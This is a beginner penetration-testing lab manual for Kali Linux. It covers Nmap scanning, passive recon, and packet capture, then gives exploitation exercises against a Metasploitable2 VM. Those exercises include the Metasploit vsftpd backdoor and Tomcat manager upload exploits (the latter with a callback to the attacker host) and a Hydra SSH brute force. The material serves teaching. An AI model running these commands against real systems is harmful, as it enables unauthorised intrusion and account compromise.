
# 🛡️ Day 2 – Cybersecurity Lab Manual

This repository contains beginner-friendly, hands-on **penetration testing exercises** using **Kali Linux**, **Metasploitable2**, and common cybersecurity tools. These labs are ideal for students learning ethical hacking and real-world security analysis.

---

##  Theory Recap

### Key Concepts:
- **IP Address**: Unique identifier for a device on a network
- **Ports**: Logical endpoints (e.g., port 80 = HTTP)
- **Protocols**:
  - **TCP** – reliable, connection-based (3-way handshake)
  - **UDP** – faster, connectionless

###  TCP 3-Way Handshake:
1. SYN →  
2. SYN-ACK →  
3. ACK

---

##  Practical Labs

###  Lab 1: Nmap for Network Scanning

**Goal**: Discover live hosts, open ports, and services.

####  Install Nmap
```bash
sudo apt update
sudo apt install nmap
```

####  Basic Commands:
- Ping scan:
  ```bash
  nmap -sn 192.168.1.0/24
  ```
- Scan specific host:
  ```bash
  nmap 192.168.1.10
  ```
- Scan specific ports:
  ```bash
  nmap -p 22,80,443 192.168.1.10
  ```
- Service version detection:
  ```bash
  nmap -sV 192.168.1.10
  ```
- Aggressive scan:
  ```bash
  nmap -A 192.168.1.10
  ```

Tip: Use `man nmap` for more options.

---

###  Lab 2: Passive Recon – Whois, Nslookup, theHarvester

**Goal**: Gather information about domains without touching the target server directly.

####  Whois
```bash
whois example.com
```

####  Nslookup
```bash
nslookup example.com
```

####  theHarvester
**Install:**
```bash
sudo apt install theharvester
```

**Example:**
```bash
theharvester -d example.com -l 100 -b bing
```

---

### Lab 3: Packet Capture with Wireshark

**Goal**: Observe live network traffic.

#### Steps:
1. Open Wireshark: `sudo wireshark`
2. Select your network interface (e.g., `eth0`)
3. Start capture
4. Visit a website
5. Stop capture
6. Apply filter: `http` or `tcp.port == 80`
7. Right-click a packet → Follow TCP Stream

---

### Lab 4: tcpdump (CLI Packet Capture)

**Goal**: Capture packets using the command line.

#### Basic Commands:
- Start capture:
  ```bash
  sudo tcpdump -i eth0
  ```
- Filter HTTP traffic:
  ```bash
  sudo tcpdump -i eth0 port 80
  ```
- Save to a file:
  ```bash
  sudo tcpdump -i eth0 -w output.pcap
  ```

#### Open `.pcap` in Wireshark:
```bash
wireshark output.pcap
```

---

## Metasploitable2 Exploitation Labs

### Setup
- **Kali Linux** as attacker
- **Metasploitable2** as vulnerable target
- Same Host-Only or NAT network

---

### Exercise 1: Discover Target Machine
```bash
netdiscover -r 192.168.56.0/24
```

---

### Exercise 2: Scan for Open Ports
```bash
nmap -sS -sV <TARGET_IP>
```

---

### Exercise 3: Exploit FTP – vsftpd 2.3.4
```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <TARGET_IP>
run
```

---

### Exercise 4: Web Directory Enumeration
```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

---

### Exercise 5: SSH Brute-force Attack
```bash
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
```

---

### Exercise 6: Exploit Tomcat Manager
```bash
use exploit/multi/http/tomcat_mgr_upload
set RHOST <TARGET_IP>
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
set LHOST <KALI_IP>
run
```

---




---

## Disclaimer

This lab is for **educational purposes only**. Do not run these scans or exploits on real-world or unauthorized networks.

---
